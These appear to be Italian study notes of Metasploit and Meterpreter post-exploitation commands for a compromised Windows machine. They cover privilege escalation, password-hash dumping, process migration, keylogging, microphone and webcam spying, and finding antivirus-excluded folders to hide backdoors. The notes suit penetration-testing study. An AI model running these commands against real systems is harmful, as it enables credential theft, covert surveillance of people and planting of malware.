Possiamo utilizzare questi moduli post exploitation per enumerare le informazioni sul
sistema Windows a cui abbiamo accesso:

- Enumerare i privilegi degli utenti
- Enumerare gli utenti connessi
- Controllo VM
- Enumerare i programmi installati
- Enumerare gli AV
- Enumerare i computer collegati al dominio
- Enumerare le patch installate
- Enumerare le azioni

COMANDI METERPRETER PER windows

molto piu potente rispetto alla linux

- `help` apre lista comando
- `getsystem` se siamo fortunati ci scala cosi
- **getprivs** vediamo se c’è uno dei privilegi necessari per sfruttare vulnerabilità Token. Uno dei seguenti
    - **SeAssignPrimaryToken** se presente procedere con il punt 4
    - **SeCreateToken**
    - **SeImpersonatePrivilege** se è presente questo possiamo ottenere privilegi digitando `getsystem`
- **`hashdump**` ci darà LM hash (uguale per tutti gli utentu) e la NTLM hash (univoca)
    - copiare gli hash insieme **Esempio= LM0000000:NTLM00000**
- `show_mount` lista gli hardisks
    - **fixed** sono ad esempio il disco C:\
    - **removible** sono per esempio le pennette USB
1. `ps` lista i processi
    1. `migrate explorer.exe`migra su quel processo e trasforma meterpreter in sessione x64

COMANDI PER SPIARE

- `screenshot` salva lo schermo del target
- `keyscan_start` cattura i tasti premuti sul target
- `keyscan_stop`
- `record_mic` avvia la registrazione del microfono sul target
- `webcam_list` lista le webcam
- webacam_steam avvia una registrazione sulla webcam selezionata

### Moduli msconsole per post Exploitation

tutti i moduli eseguiti vengono salvati da metasploit in una directory, possiamo vedere cosa salva e cosa cattura con il comando `loot`

- `use post/windows/gather/win_privs` enumera i privilegi (getpriv ma meglio)
- `use post/windows/gather/enum_logged_on_users` enumera gli utenti loggati in questo momento e quelli recenti
- `use post/windows/gather/checkvm` verifica se il target è un VM
- `use post/windows/gather/enum_applications` enumera le app e i programmi istallati, SUPER POTETNE per trovare vulnerabilità e scalare i privilegi tra i servizi elencati
- `use post/windows/gather/enum_computers` enumera i PC connessi alla stessa rete del target
- `use post/windows/gather/enum_shares` enumera le cartelle condivise
- `use post/windows/gather/enum_av_excluded` enumera le Directory che non sono scansionate dall’AV. Utile per sapere dove inserire file malevoli e backdoor
